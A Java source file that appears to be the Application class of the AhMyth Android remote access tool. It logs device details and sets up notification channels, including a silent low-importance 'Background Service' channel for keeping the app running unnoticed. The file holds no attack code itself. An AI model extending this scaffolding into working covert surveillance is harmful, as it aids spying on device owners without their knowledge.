package ahmyth.mine.king.ahmyth;

import android.app.Application;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import android.util.Log;

/**
 * Custom Application class for AhMyth
 * Handles app-wide initialization and notification channels for Android 8+
 */
public class AhMythApplication extends Application {

    private static final String TAG = "AhMythApp";
    
    // Notification Channel IDs
    public static final String CHANNEL_ID_SERVICE = "ahmyth_service_channel";
    public static final String CHANNEL_ID_ALERTS = "ahmyth_alerts_channel";
    
    private static AhMythApplication instance;
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        
        Log.d(TAG, "Application onCreate");
        Log.d(TAG, "Device: " + Build.MANUFACTURER + " " + Build.MODEL);
        Log.d(TAG, "Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")");
        
        // Create notification channels for Android 8+
        createNotificationChannels();
        
        // Start service in background
        // try {
        //     MainService.startService(this);
        // } catch (Exception e) {
        //     Log.e(TAG, "Error starting service from Application", e);
        // }
    }
    
    public static AhMythApplication getInstance() {
        return instance;
    }
    
    public static Context getAppContext() {
        return instance.getApplicationContext();
    }
    
    private void createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Log.d(TAG, "Creating notification channels");
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            
            if (manager != null) {
                // Service channel - low priority, silent
                NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID_SERVICE,
                    "Background Service",
                    NotificationManager.IMPORTANCE_LOW
                );
                serviceChannel.setDescription("Keeps the app running in background");
                serviceChannel.setShowBadge(false);
                serviceChannel.enableLights(false);
                serviceChannel.enableVibration(false);
                serviceChannel.setSound(null, null);
                manager.createNotificationChannel(serviceChannel);
                
                // Alerts channel - for important notifications
                NotificationChannel alertsChannel = new NotificationChannel(
                    CHANNEL_ID_ALERTS,
                    "Alerts",
                    NotificationManager.IMPORTANCE_DEFAULT
                );
                alertsChannel.setDescription("Important notifications");
                manager.createNotificationChannel(alertsChannel);
                
                Log.d(TAG, "Notification channels created successfully");
            }
        }
    }
    
    @Override
    public void onTerminate() {
        super.onTerminate();
        Log.d(TAG, "Application onTerminate");
    }
    
    @Override
    public void onLowMemory() {
        super.onLowMemory();
        Log.w(TAG, "Low memory warning");
    }
}

